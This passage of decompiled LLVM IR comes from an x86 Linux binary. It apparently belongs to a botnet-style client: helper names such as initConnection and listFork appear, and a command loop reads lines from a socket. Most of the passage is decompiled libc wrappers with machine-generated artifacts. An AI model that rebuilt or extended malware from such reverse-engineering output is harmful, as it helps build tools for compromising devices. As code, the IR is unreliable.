  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_804d40a ], [ %stack_var_-96.1, %dec_label_pc_804d6e5 ], [ %stack_var_-96.1, %dec_label_pc_804d71c ], [ %stack_var_-96.1, %dec_label_pc_804da2b ], [ %stack_var_-96.1, %dec_label_pc_804d875 ], [ %stack_var_-96.1, %dec_label_pc_804da56 ]
  br label %dec_label_pc_804da73

dec_label_pc_804da73:                             ; preds = %dec_label_pc_804da73.outer, %dec_label_pc_804d65e
  %v0_804da79 = load i32, i32* @global_var_80584c0.18, align 64
  store i32 %v0_804da79, i32* %stack_var_-5888, align 4
  %v5_804da8e = call i32 @recvLine(i32 %v0_804da79, i8* %tmp121, i32 4096)
  %v8_804da96 = icmp ne i32 %v5_804da8e, -1
  store i1 %v8_804da96, i1* %cf.global-to-local, align 1
  %v13_804da96 = icmp eq i32 %v5_804da8e, -1
  %v1_804da9a = icmp eq i1 %v13_804da96, false
  br i1 %v1_804da9a, label %dec_label_pc_804d604, label %dec_label_pc_804d3f3.outer

; uselistorder directives
  uselistorder i32 %v5_804da8e, { 0, 2, 1 }
  uselistorder i32 %stack_var_-96.2.ph, { 0, 2, 1 }
  uselistorder i32 %v4_804da68, { 1, 0, 2 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v1_804d9a7, { 1, 0 }
  uselistorder i32 %stack_var_-40.142, { 0, 3, 2, 1 }
  uselistorder i8* %v3_804d98c, { 2, 1, 0 }
  uselistorder i32 %v4_804d8d3, { 2, 1, 3, 0 }
  uselistorder i1 %v0_804d85e, { 1, 0 }
  uselistorder i32 %v7_804d85c, { 1, 0 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v5_804d81f, { 1, 0 }
  uselistorder i32 %v1_804d813, { 1, 0 }
  uselistorder i8* %storemerge12165, { 1, 0 }
  uselistorder i32 %v6_804d7cc, { 1, 0 }
  uselistorder i32 %v6_804d7a3, { 1, 0 }
  uselistorder i32 %v6_804d77e, { 1, 0 }
  uselistorder i8* %v5_804d75b, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804d758, { 4, 5, 0, 1, 2, 6, 7, 3, 8 }
  uselistorder i32 %v6_804d755, { 1, 0 }
  uselistorder i8* %storemerge13.lcssa, { 1, 0 }
  uselistorder i32 %v4_804d6bf, { 1, 2, 3, 0 }
  uselistorder i32 %storemerge14, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v0_804d5aa, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0, 2 }
  uselistorder i32 %v2_804d577, { 1, 0 }
  uselistorder i32 %v1_804d563, { 1, 0 }
  uselistorder i32 %v2_804d55a, { 1, 0 }
  uselistorder i32 %v0_804d52f, { 1, 0 }
  uselistorder i32 %v0_804d4d4, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 2, 0, 3 }
  uselistorder i8* %storemerge13127, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804d882, { 5, 4, 2, 3, 0, 1, 7, 6, 9, 8, 10 }
  uselistorder i8* %tmp121, { 2, 0, 1 }
  uselistorder i32 %v2_804da73, { 2, 0, 4, 6, 5, 1, 7, 9, 8, 10, 3 }
  uselistorder i32 %v1_804d356, { 1, 0, 2 }
  uselistorder i32 %v3_804d309, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804d2ae, { 0, 2, 1 }
  uselistorder i32 %v2_804d28f, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v7_804d232, { 1, 0 }
  uselistorder i32 %v2_804d1f1, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 7, 6, 5, 1, 0, 3, 2, 4, 8 }
  uselistorder i32* %stack_var_-5888, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 37, 34, 35, 2, 1, 38, 40, 41, 42, 39, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 32, 2, 46, 3, 5, 4, 48, 6, 56, 7, 8, 9, 10, 1, 11, 12, 0, 13, 14, 16, 17, 15, 18, 19, 20, 21, 50, 22, 23, 24, 25, 26, 27, 31, 49, 28, 29, 30, 33, 47, 44, 34, 45, 35, 36, 37, 38, 39, 41, 40, 42, 43, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 2, 1 }
  uselistorder i8 33, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @Rootsprintf, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80560ac.131 to i32), { 0, 2, 1 }
  uselistorder [2 x i8]* @global_var_805609d.129, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_805609d.129 to i32), { 1, 0 }
  uselistorder i32 (i32)* @srand, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 20, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 18, 19 }
  uselistorder i32 ptrtoint (i32* @global_var_8056089.127 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_804da73.outer, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804da56, { 1, 0 }
  uselistorder label %dec_label_pc_804da0a, { 1, 0 }
  uselistorder label %dec_label_pc_804d97b, { 1, 0 }
  uselistorder label %dec_label_pc_804d950, { 1, 0 }
  uselistorder label %dec_label_pc_804d8dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d807, { 1, 0 }
  uselistorder label %dec_label_pc_804d7f6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d7ec, { 1, 0 }
  uselistorder label %dec_label_pc_804d785, { 1, 0 }
  uselistorder label %dec_label_pc_804d71c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d712, { 1, 0 }
  uselistorder label %dec_label_pc_804d6e5, { 1, 0 }
  uselistorder label %dec_label_pc_804d601, { 1, 0 }
  uselistorder label %dec_label_pc_804d596, { 1, 0 }
  uselistorder label %dec_label_pc_804d574, { 1, 0 }
  uselistorder label %dec_label_pc_804d4c0, { 1, 0 }
  uselistorder label %dec_label_pc_804d496, { 1, 0 }
  uselistorder label %dec_label_pc_804d3fc, { 1, 0 }
  uselistorder label %dec_label_pc_804d3f3.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d3cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d351, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804d250, { 1, 0 }
  uselistorder label %dec_label_pc_804d1af, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_804daae = call i32 @vfork()
  %v5_804dab1 = icmp ult i32 %v0_804daae, -4095
  %v1_804dab6 = icmp eq i1 %v5_804dab1, false
  call void @__pseudo_cond_branch(i1 %v1_804dab6, i32 134552948)
  ret i32 %v0_804daae
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804dac0 = load i32, i32* @edi, align 4
  %v0_804dac1 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804dad9 = add i32 %arg2, -12
  %v6_804dadf = icmp ugt i32 %v1_804dad9, 2
  br i1 %v6_804dadf, label %dec_label_pc_804daef, label %dec_label_pc_804dae1

dec_label_pc_804dae1:                             ; preds = %entry
  %v4_804dae5 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804dad9)
  br label %dec_label_pc_804db11

dec_label_pc_804daef:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804daf7 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804daf7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804daf7, -4095
  br i1 %tmp, label %dec_label_pc_804db0f, label %dec_label_pc_804db03

dec_label_pc_804db03:                             ; preds = %dec_label_pc_804daef
  %v1_804db03 = call i32 @__errno_location(i32 %v0_804dac1)
  %v0_804db08 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804db08 = sub i32 0, %v0_804db08
  %v2_804db0a = inttoptr i32 %v1_804db03 to i32*
  store i32 %v1_804db08, i32* %v2_804db0a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804db0f

dec_label_pc_804db0f:                             ; preds = %dec_label_pc_804daef, %dec_label_pc_804db03
  %v0_804db0f = phi i32 [ %v2_804daf7, %dec_label_pc_804daef ], [ -1, %dec_label_pc_804db03 ]
  br label %dec_label_pc_804db11

dec_label_pc_804db11:                             ; preds = %dec_label_pc_804dae1, %dec_label_pc_804db0f
  %v0_804db16 = phi i32 [ %v4_804dae5, %dec_label_pc_804dae1 ], [ %v0_804db0f, %dec_label_pc_804db0f ]
  store i32 %v0_804dac1, i32* @ebx, align 4
  store i32 %v0_804dac0, i32* @edi, align 4
  ret i32 %v0_804db16

; uselistorder directives
  uselistorder i32 %v2_804daf7, { 1, 0, 2 }
  uselistorder i32 %v0_804dac1, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804db11, { 1, 0 }
  uselistorder label %dec_label_pc_804db0f, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804db18 = load i32, i32* @edi, align 4
  store i32 %v0_804db18, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804db30 = load i32, i32* @ebx, align 4
  %v1_804db38 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804db38, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804db38, -4095
  br i1 %tmp, label %dec_label_pc_804db50, label %dec_label_pc_804db44

dec_label_pc_804db44:                             ; preds = %entry
  %v1_804db44 = call i32 @__errno_location(i32 %v0_804db30)
  %v0_804db49 = load i32, i32* %edi.global-to-local, align 4
  %v1_804db49 = sub i32 0, %v0_804db49
  %v2_804db4b = inttoptr i32 %v1_804db44 to i32*
  store i32 %v1_804db49, i32* %v2_804db4b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804db50

dec_label_pc_804db50:                             ; preds = %entry, %dec_label_pc_804db44
  %v0_804db53 = phi i32 [ %v1_804db38, %entry ], [ -1, %dec_label_pc_804db44 ]
  %v2_804db55 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804db55, i32* %edi.global-to-local, align 4
  ret i32 %v0_804db53

; uselistorder directives
  uselistorder i32 %v1_804db38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804db50, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804db59 = load i32, i32* @ebx, align 4
  store i32 %v0_804db59, i32* %stack_var_-8, align 4
  %v5_804db5a = icmp ult i32* %stack_var_-8, inttoptr (i32 4 to i32*)
  store i1 %v5_804db5a, i1* @cf, align 1
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804db80 = load i32, i32* @edi, align 4
  store i32 %v0_804db80, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804db88 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804db90 = call i32 @chdir(i32 %v0_804db88)
  store i32 %v0_804db88, i32* @ebx, align 4
  store i32 %v1_804db90, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804db90, -4095
  br i1 %tmp, label %dec_label_pc_804dba8, label %dec_label_pc_804db9c

dec_label_pc_804db9c:                             ; preds = %entry
  %v1_804db9c = call i32 @__errno_location(i32 %v0_804db88)
  %v0_804dba1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dba1 = sub i32 0, %v0_804dba1
  %v2_804dba3 = inttoptr i32 %v1_804db9c to i32*
  store i32 %v1_804dba1, i32* %v2_804dba3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dba8

dec_label_pc_804dba8:                             ; preds = %entry, %dec_label_pc_804db9c
  %v0_804dba9 = phi i32 [ %v1_804db90, %entry ], [ -1, %dec_label_pc_804db9c ]
  %v2_804dba8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dba8, i32* @edx, align 4
  %v2_804dbac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dbac, i32* @edi, align 4
  ret i32 %v0_804dba9

; uselistorder directives
  uselistorder i32 %v1_804db90, { 1, 0, 2 }
  uselistorder i32 %v0_804db88, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dba8, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dbb0 = load i32, i32* @edi, align 4
  store i32 %v0_804dbb0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dbb8 = load i32, i32* @ebx, align 4
  %v1_804dbc0 = call i32 @close(i32 %arg1)
  store i32 %v0_804dbb8, i32* @ebx, align 4
  store i32 %v1_804dbc0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dbc0, -4095
  br i1 %tmp, label %dec_label_pc_804dbd8, label %dec_label_pc_804dbcc

dec_label_pc_804dbcc:                             ; preds = %entry
  %v1_804dbcc = call i32 @__errno_location(i32 %v0_804dbb8)
  %v0_804dbd1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dbd1 = sub i32 0, %v0_804dbd1
  %v2_804dbd3 = inttoptr i32 %v1_804dbcc to i32*
  store i32 %v1_804dbd1, i32* %v2_804dbd3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dbd8

dec_label_pc_804dbd8:                             ; preds = %entry, %dec_label_pc_804dbcc
  %v0_804dbd9 = phi i32 [ %v1_804dbc0, %entry ], [ -1, %dec_label_pc_804dbcc ]
  %v2_804dbd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dbd8, i32* @edx, align 4
  %v2_804dbdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dbdc, i32* @edi, align 4
  ret i32 %v0_804dbd9

; uselistorder directives
  uselistorder i32 %v1_804dbc0, { 1, 0, 2 }
  uselistorder i32 %v0_804dbb8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dbd8, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804dbe0 = load i32, i32* @ebx, align 4
  store i32 %v0_804dbe0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804dbf3 = call i32 @dup2(i32 %v0_804dbe0, i32 %tmp4)
  store i32 %v2_804dbf3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804dbf3, -4095
  br i1 %tmp, label %dec_label_pc_804dc0c, label %dec_label_pc_804dc00

dec_label_pc_804dc00:                             ; preds = %entry
  %v0_804dc00 = load i32, i32* %stack_var_-4, align 4
  %v1_804dc00 = call i32 @__errno_location(i32 %v0_804dc00)
  %v0_804dc05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dc05 = sub i32 0, %v0_804dc05
  %v2_804dc07 = inttoptr i32 %v1_804dc00 to i32*
  store i32 %v1_804dc05, i32* %v2_804dc07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dc0c

dec_label_pc_804dc0c:                             ; preds = %entry, %dec_label_pc_804dc00
  %v0_804dc0d = phi i32 [ %v2_804dbf3, %entry ], [ -1, %dec_label_pc_804dc00 ]
  %v2_804dc10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc10, i32* @ebx, align 4
  ret i32 %v0_804dc0d

; uselistorder directives
  uselistorder i32 %v2_804dbf3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dc0c, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc14 = load i32, i32* @ebx, align 4
  store i32 %v0_804dc14, i32* %stack_var_-4, align 4
  %v1_804dc1d = call i32 @fork(i32 %v0_804dc14)
  store i32 %v1_804dc1d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dc1d, -4095
  br i1 %tmp, label %dec_label_pc_804dc34, label %dec_label_pc_804dc28

dec_label_pc_804dc28:                             ; preds = %entry
  %v0_804dc28 = load i32, i32* %stack_var_-4, align 4
  %v1_804dc28 = call i32 @__errno_location(i32 %v0_804dc28)
  %v0_804dc2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dc2d = sub i32 0, %v0_804dc2d
  %v2_804dc2f = inttoptr i32 %v1_804dc28 to i32*
  store i32 %v1_804dc2d, i32* %v2_804dc2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dc34

dec_label_pc_804dc34:                             ; preds = %entry, %dec_label_pc_804dc28
  %v0_804dc35 = phi i32 [ %v1_804dc1d, %entry ], [ -1, %dec_label_pc_804dc28 ]
  %v2_804dc34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc34, i32* @edx, align 4
  %v2_804dc38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc38, i32* @ebx, align 4
  ret i32 %v0_804dc35

; uselistorder directives
  uselistorder i32 %v1_804dc1d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dc34, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-44, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %v0_804dc3c = load i32, i32* @ebp, align 4
  %v0_804dc3d = load i32, i32* @edi, align 4
  %v0_804dc3e = load i32, i32* @esi, align 4
  %v0_804dc3f = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804dc4b = icmp eq i32 %arg2, 0
  %v1_804dc4d = icmp eq i1 %v1_804dc4b, false
  %v1_804dc77 = icmp eq i32 %arg1, 0
  br i1 %v1_804dc4d, label %dec_label_pc_804dc77, label %dec_label_pc_804dc4f

dec_label_pc_804dc4f:                             ; preds = %entry
  br i1 %v1_804dc77, label %dec_label_pc_804dc63, label %dec_label_pc_804dc53

dec_label_pc_804dc53:                             ; preds = %dec_label_pc_804dc4f
  %v1_804dc53 = call i32 @__errno_location(i32 %v0_804dc3f)
  %v1_804dc58 = inttoptr i32 %v1_804dc53 to i32*
  store i32 22, i32* %v1_804dc58, align 4
  br label %dec_label_pc_804dce8

dec_label_pc_804dc63:                             ; preds = %dec_label_pc_804dc4f
  %v3_804dc63 = call i32 @__GI_getpagesize(i32 %v0_804dc3f, i32 %v0_804dc3e, i32 %v0_804dc3d)
  %v1_804dc6d = add i32 %v3_804dc63, -4096
  %v3_804dc6d = sub i32 4095, %v3_804dc63
  %v4_804dc6d = and i32 %v3_804dc6d, %v3_804dc63
  %v5_804dc6d = icmp slt i32 %v4_804dc6d, 0
  %v7_804dc6d = icmp slt i32 %v1_804dc6d, 0
  %v2_804dc72 = icmp eq i1 %v7_804dc6d, %v5_804dc6d
  %v5_804dc72 = select i1 %v2_804dc72, i32 %v3_804dc63, i32 4096
  store i32 %v5_804dc72, i32* @ebx, align 4
  br label %dec_label_pc_804dc7f

dec_label_pc_804dc77:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804dc7d = icmp eq i1 %v1_804dc77, false
  br i1 %v1_804dc7d, label %dec_label_pc_804dc91, label %dec_label_pc_804dc7f

dec_label_pc_804dc7f:                             ; preds = %dec_label_pc_804dc77, %dec_label_pc_804dc63
  %v0_804dc82 = phi i32 [ %arg2, %dec_label_pc_804dc77 ], [ %v5_804dc72, %dec_label_pc_804dc63 ]
  store i32 %v0_804dc82, i32* %stack_var_-44, align 4
  %v1_804dc83 = call i32 @malloc(i32 %v0_804dc82)
  %v1_804dc8b = icmp eq i32 %v1_804dc83, 0
  store i32 %v1_804dc83, i32* @esi, align 4
  br i1 %v1_804dc8b, label %dec_label_pc_804dce8, label %dec_label_pc_804dc7f.dec_label_pc_804dc91_crit_edge

dec_label_pc_804dc7f.dec_label_pc_804dc91_crit_edge: ; preds = %dec_label_pc_804dc7f
  %v0_804dc9c.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_804dc91

dec_label_pc_804dc91:                             ; preds = %dec_label_pc_804dc7f.dec_label_pc_804dc91_crit_edge, %dec_label_pc_804dc77
  %v0_804dc9c = phi i32 [ %v0_804dc9c.pre, %dec_label_pc_804dc7f.dec_label_pc_804dc91_crit_edge ], [ %tmp12, %dec_label_pc_804dc77 ]
  %v0_804dc91 = phi i32 [ %v1_804dc83, %dec_label_pc_804dc7f.dec_label_pc_804dc91_crit_edge ], [ %arg1, %dec_label_pc_804dc77 ]
  store i32 %v0_804dc91, i32* @ebx, align 4
  %v2_804dc9c = call i32 @getcwd(i32 %v0_804dc9c, i32 %tmp13)
  %v0_804dc9e = load i32, i32* @ebx, align 4
  store i32 %v0_804dc9e, i32* @edx, align 4
  store i32 %v2_804dc9c, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_804dc9c, -4095
  br i1 %tmp, label %dec_label_pc_804dcb4, label %dec_label_pc_804dca9

dec_label_pc_804dca9:                             ; preds = %dec_label_pc_804dc91
  %v0_804dca9 = load i32, i32* %stack_var_-44, align 4
  %v1_804dca9 = call i32 @__errno_location(i32 %v0_804dca9)
  %v0_804dcae = load i32, i32* @ebx, align 4
  %v1_804dcae = sub i32 0, %v0_804dcae
  store i32 %v1_804dcae, i32* @ebx, align 4
  %v2_804dcb0 = inttoptr i32 %v1_804dca9 to i32*
  store i32 %v1_804dcae, i32* %v2_804dcb0, align 4
  br label %dec_label_pc_804dcd6

dec_label_pc_804dcb4:                             ; preds = %dec_label_pc_804dc91
  %v2_804dcb4 = icmp slt i32 %v2_804dc9c, 0
  br i1 %v2_804dcb4, label %dec_label_pc_804dcd6, label %dec_label_pc_804dcb8

dec_label_pc_804dcb8:                             ; preds = %dec_label_pc_804dcb4
  %v0_804dcb8 = load i32, i32* @edi, align 4
  %v1_804dcb8 = icmp eq i32 %v0_804dcb8, 0
  %v1_804dcba = icmp eq i1 %v1_804dcb8, false
  br i1 %v1_804dcba, label %dec_label_pc_804dcea, label %dec_label_pc_804dcbc

dec_label_pc_804dcbc:                             ; preds = %dec_label_pc_804dcb8
  br i1 %v1_804dc4d, label %dec_label_pc_804dcd2, label %dec_label_pc_804dcc0

dec_label_pc_804dcc0:                             ; preds = %dec_label_pc_804dcbc
  %v0_804dcc3 = load i32, i32* @esi, align 4
  store i32 %v0_804dcc3, i32* %stack_var_-44, align 4
  %v4_804dcc4 = inttoptr i32 %v0_804dcc3 to i32*
  %v5_804dcc4 = call i32 @realloc(i32* %v4_804dcc4, i32 %v2_804dc9c, i32 %v0_804dc9e, i32 %v0_804dc9e)
  %v1_804dccc = icmp eq i32 %v5_804dcc4, 0
  %v1_804dcd0 = icmp eq i1 %v1_804dccc, false
  br i1 %v1_804dcd0, label %dec_label_pc_804dcea, label %dec_label_pc_804dcd2

dec_label_pc_804dcd2:                             ; preds = %dec_label_pc_804dcc0, %dec_label_pc_804dcbc
  %v0_804dcd2 = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dcea

dec_label_pc_804dcd6:                             ; preds = %dec_label_pc_804dcb4, %dec_label_pc_804dca9
  %v0_804dcd6 = load i32, i32* @edi, align 4
  %v1_804dcd6 = icmp eq i32 %v0_804dcd6, 0
  %v1_804dcd8 = icmp eq i1 %v1_804dcd6, false
  br i1 %v1_804dcd8, label %dec_label_pc_804dce8, label %dec_label_pc_804dcda

dec_label_pc_804dcda:                             ; preds = %dec_label_pc_804dcd6
  %v0_804dcdd = load i32, i32* @esi, align 4
  store i32 %v0_804dcdd, i32* %stack_var_-44, align 4
  %v1_804dcde = call i32 @free(i32 %v0_804dcdd)
  %v0_804dced.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804dcea

dec_label_pc_804dce8:                             ; preds = %dec_label_pc_804dcd6, %dec_label_pc_804dc7f, %dec_label_pc_804dc53
  br label %dec_label_pc_804dcea

dec_label_pc_804dcea:                             ; preds = %dec_label_pc_804dcc0, %dec_label_pc_804dcb8, %dec_label_pc_804dcda, %dec_label_pc_804dcd2, %dec_label_pc_804dce8
  %v0_804dced = phi i32 [ %v5_804dcc4, %dec_label_pc_804dcc0 ], [ %v0_804dcb8, %dec_label_pc_804dcb8 ], [ %v0_804dced.pre, %dec_label_pc_804dcda ], [ %v0_804dcd2, %dec_label_pc_804dcd2 ], [ 0, %dec_label_pc_804dce8 ]
  %v0_804dcea = load i32, i32* @esp, align 4
  %v5_804dcea = icmp ugt i32 %v0_804dcea, -13
  store i1 %v5_804dcea, i1* @cf, align 1
  store i32 %v0_804dc3f, i32* @ebx, align 4
  store i32 %v0_804dc3e, i32* @esi, align 4
  store i32 %v0_804dc3d, i32* @edi, align 4
  store i32 %v0_804dc3c, i32* @ebp, align 4
  ret i32 %v0_804dced

; uselistorder directives
  uselistorder i32 %v2_804dc9c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_804dc82, { 1, 0 }
  uselistorder i32 %v3_804dc63, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i1* @cf, { 0, 4, 1, 2, 3 }
  uselistorder i32 -13, { 1, 0 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804dcea, { 4, 2, 3, 0, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804dcf7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804dcfe = call i32 @getrlimit(i32 7, i32 %v2_804dcf7)
  store i32 256, i32* @edx, align 4
  %v2_804dd0b = icmp slt i32 %v2_804dcfe, 0
  br i1 %v2_804dd0b, label %dec_label_pc_804dd13, label %dec_label_pc_804dd0f

dec_label_pc_804dd0f:                             ; preds = %entry
  %v3_804dd0f = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804dd0f, i32* @edx, align 4
  br label %dec_label_pc_804dd13

dec_label_pc_804dd13:                             ; preds = %entry, %dec_label_pc_804dd0f
  %v0_804dd13 = phi i32 [ 256, %entry ], [ %v3_804dd0f, %dec_label_pc_804dd0f ]
  ret i32 %v0_804dd13

; uselistorder directives
  uselistorder label %dec_label_pc_804dd13, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804dd1c = load i32, i32* @global_var_805e710.141, align 16
  store i32 %v0_804dd1c, i32* @edx, align 4
